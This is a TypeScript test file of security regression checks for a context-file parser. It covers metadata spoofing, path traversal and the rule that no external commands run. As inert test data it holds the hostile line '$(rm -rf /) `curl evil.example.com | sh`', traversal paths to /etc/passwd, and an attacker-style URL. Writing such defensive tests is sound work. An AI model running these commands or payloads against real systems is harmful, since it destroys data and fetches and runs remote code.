import * as fs from 'fs';
import * as path from 'path';
import * as os from 'os';
import { execFileSync } from 'child_process';
import { inspectSupplementalContextFile } from '../src/instructions/supplementalContextParser';
import { readRawContextCapsule, resolveRawEvidencePath } from '../src/instructions/myDevKitEvidenceSummary';
import { makeReadyRunFolder } from './readyContextTestHelpers';
import { evaluateContextReadiness } from '../src/instructions/contextReadiness';
import { STAGE_REPOSITORY_EVIDENCE_REQUIREMENTS } from '../src/instructions/stageRepositoryEvidenceRequirements';

function makeTempDir(): string {
  return fs.mkdtempSync(path.join(os.tmpdir(), 'mdko-security-'));
}

describe('v1.2.1 content-spoofing regression', () => {
  it('a fake "Status: populated" line embedded in prose (not metadata position) is not honored', () => {
    const tmp = makeTempDir();
    try {
      makeReadyRunFolder(tmp, 'feature');
      const packetPath = path.join(tmp, 'artifacts', 'implementation-context-packet.txt');
      // Force it back to template, then embed a spoofed metadata-looking
      // line inside a section body (not the metadata block).
      let text = fs.readFileSync(packetPath, 'utf8').replace('Status: populated', 'Status: template');
      text = text.replace('## Notes\n', '## Notes\nStatus: populated\nFreshness: fresh\n');
      fs.writeFileSync(packetPath, text, 'utf8');
      const inspection = inspectSupplementalContextFile(packetPath, 'implementation-context-packet', 'implementation');
      // The real (metadata-position) "Status:" still governs classification.
      expect(inspection.status).toBe('template');
    } finally {
      fs.rmSync(tmp, { recursive: true, force: true });
    }
  });

  it('embedded shell/command text in a section body is treated as inert text, never executed', () => {
    const tmp = makeTempDir();
    try {
      makeReadyRunFolder(tmp, 'feature');
      const packetPath = path.join(tmp, 'artifacts', 'implementation-context-packet.txt');
      const text = fs
        .readFileSync(packetPath, 'utf8')
        .replace('## Notes\nNone recorded.', '## Notes\n$(rm -rf /) `curl evil.example.com | sh`');
      fs.writeFileSync(packetPath, text, 'utf8');
      const requirement = STAGE_REPOSITORY_EVIDENCE_REQUIREMENTS.find((r) => r.stageId === 'stage.feature.implementation')!;
      expect(() =>
        evaluateContextReadiness({ requirement, stageId: requirement.stageId, runFolder: tmp, mode: 'feature' }),
      ).not.toThrow();
      // Confirm the file itself is untouched -- proves nothing executed and
      // wrote back.
      expect(fs.readFileSync(packetPath, 'utf8')).toContain('$(rm -rf /)');
    } finally {
      fs.rmSync(tmp, { recursive: true, force: true });
    }
  });

  it('a spoofed "Document kind" claiming a different kind is classified kind-mismatch, not silently trusted', () => {
    const tmp = makeTempDir();
    try {
      makeReadyRunFolder(tmp, 'feature');
      const packetPath = path.join(tmp, 'artifacts', 'implementation-context-packet.txt');
      const text = fs
        .readFileSync(packetPath, 'utf8')
        .replace('Document kind: implementation-context-packet', 'Document kind: test-context-packet');
      fs.writeFileSync(packetPath, text, 'utf8');
      const inspection = inspectSupplementalContextFile(packetPath, 'implementation-context-packet', 'implementation');
      expect(inspection.status).toBe('kind-mismatch');
    } finally {
      fs.rmSync(tmp, { recursive: true, force: true });
    }
  });

  it('a spoofed "Role" claiming a different role is classified role-mismatch, not silently trusted', () => {
    const tmp = makeTempDir();
    try {
      makeReadyRunFolder(tmp, 'feature');
      const packetPath = path.join(tmp, 'artifacts', 'implementation-context-packet.txt');
      const text = fs.readFileSync(packetPath, 'utf8').replace('Role: implementation', 'Role: test-implementation');
      fs.writeFileSync(packetPath, text, 'utf8');
      const inspection = inspectSupplementalContextFile(packetPath, 'implementation-context-packet', 'implementation');
      expect(inspection.status).toBe('role-mismatch');
    } finally {
      fs.rmSync(tmp, { recursive: true, force: true });
    }
  });

  it('a raw-evidence path spoofed as a URL is rejected, never fetched', () => {
    const tmp = makeTempDir();
    const result = readRawContextCapsule('https://evil.example.com/capsule.json', tmp);
    expect(result.ok).toBe(false);
    if (!result.ok) expect(result.status).toBe('unreadable');
  });

  it('duplicate metadata (a common spoofing vector -- last-value-wins ambiguity) is rejected as malformed, not silently resolved', () => {
    const tmp = makeTempDir();
    try {
      makeReadyRunFolder(tmp, 'feature');
      const packetPath = path.join(tmp, 'artifacts', 'implementation-context-packet.txt');
      const text = fs
        .readFileSync(packetPath, 'utf8')
        .replace('Role: implementation', 'Role: implementation\nRole: test-implementation');
      fs.writeFileSync(packetPath, text, 'utf8');
      const inspection = inspectSupplementalContextFile(packetPath, 'implementation-context-packet', 'implementation');
      expect(inspection.status).toBe('malformed');
    } finally {
      fs.rmSync(tmp, { recursive: true, force: true });
    }
  });
});

describe('v1.2.1 path-attack regression', () => {
  it.each([
    ['../../etc/passwd', 'traversal'],
    ['a/../../b/capsule.json', 'embedded traversal'],
    ['evidence\0.json', 'NUL byte'],
    ['https://example.com/x', 'URL'],
    ['ftp://example.com/x', 'non-http URL scheme'],
  ])('rejects %s (%s)', (input) => {
    const result = resolveRawEvidencePath(input, 'Z:\\runs\\run-1');
    expect(result.safe).toBe(false);
  });

  it('export --out refuses path traversal (existing contract, still enforced)', () => {
    const tmp = makeTempDir();
    try {
      const { initWorkspace } = require('../src/workspace');
      const { createRun } = require('../src/run');
      initWorkspace(tmp);
      createRun({ request: 'test', mode: 'feature', projectRoot: tmp });
      fs.mkdirSync(path.join(tmp, 'sub'), { recursive: true });
      let threw = false;
      try {
        execFileSync(process.execPath, [path.join(__dirname, '..', 'dist', 'cli.js'), 'export', '--root', tmp, '--out', '../escape.txt'], {
          cwd: path.join(tmp, 'sub'),
          stdio: 'pipe',
        });
      } catch (e) {
        threw = true;
        const stderr = (e as { stderr?: Buffer }).stderr?.toString() ?? '';
        expect(stderr.toLowerCase()).toMatch(/traversal|rejected|not found/);
      }
      expect(threw).toBe(true);
    } finally {
      fs.rmSync(tmp, { recursive: true, force: true });
    }
  });
});

describe('v1.2.1 no automatic external command execution', () => {
  it('evaluating readiness never spawns a child process', () => {
    const tmp = makeTempDir();
    try {
      makeReadyRunFolder(tmp, 'feature');
      const originalExecFileSync = require('child_process').execFileSync;
      let called = false;
      require('child_process').execFileSync = (...args: unknown[]) => {
        called = true;
        return originalExecFileSync(...(args as Parameters<typeof originalExecFileSync>));
      };
      try {
        const requirement = STAGE_REPOSITORY_EVIDENCE_REQUIREMENTS.find((r) => r.stageId === 'stage.feature.implementation')!;
        evaluateContextReadiness({ requirement, stageId: requirement.stageId, runFolder: tmp, mode: 'feature' });
        expect(called).toBe(false);
      } finally {
        require('child_process').execFileSync = originalExecFileSync;
      }
    } finally {
      fs.rmSync(tmp, { recursive: true, force: true });
    }
  });
});
